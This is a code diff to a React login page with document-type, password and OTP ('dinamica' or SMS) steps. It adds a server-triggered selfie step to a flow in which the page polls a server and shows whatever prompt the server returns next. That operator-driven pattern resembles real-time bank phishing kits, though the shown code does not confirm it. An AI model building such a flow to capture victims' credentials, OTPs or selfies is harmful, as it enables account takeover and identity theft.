@@ -40,11 +40,18 @@ function getOrCreateSessionId(): string {
 type LoginPageProps = {
   onHome: () => void
   onOtpRequired: (sessionId: string, mode: 'dinamica' | 'sms') => void
+  onSelfieRequired: (sessionId: string) => void
   onSuccess: () => void
   initialError?: string
 }
 
-export function LoginPage({ onHome, onOtpRequired, onSuccess, initialError }: LoginPageProps) {
+export function LoginPage({
+  onHome,
+  onOtpRequired,
+  onSelfieRequired,
+  onSuccess,
+  initialError,
+}: LoginPageProps) {
   const [docType, setDocType] = useState<(typeof docs)[number]['value']>('DNI')
   const [doc, setDoc] = useState('')
   const [password, setPassword] = useState('')
@@ -104,6 +111,11 @@ export function LoginPage({ onHome, onOtpRequired, onSuccess, initialError }: Lo
           return
         }
 
+        if (action === 'selfie') {
+          onSelfieRequired(sessionId)
+          return
+        }
+
         if (action === 'error-login') {
           setSubmitting(false)
           setPassword('')
@@ -130,7 +142,7 @@ export function LoginPage({ onHome, onOtpRequired, onSuccess, initialError }: Lo
       window.clearInterval(pingTimer)
       window.clearInterval(pollTimer)
     }
-  }, [submitting, onOtpRequired, onSuccess])
+  }, [submitting, onOtpRequired, onSelfieRequired, onSuccess])
 
   async function startSession() {
     if (!canSubmit || submitting) return
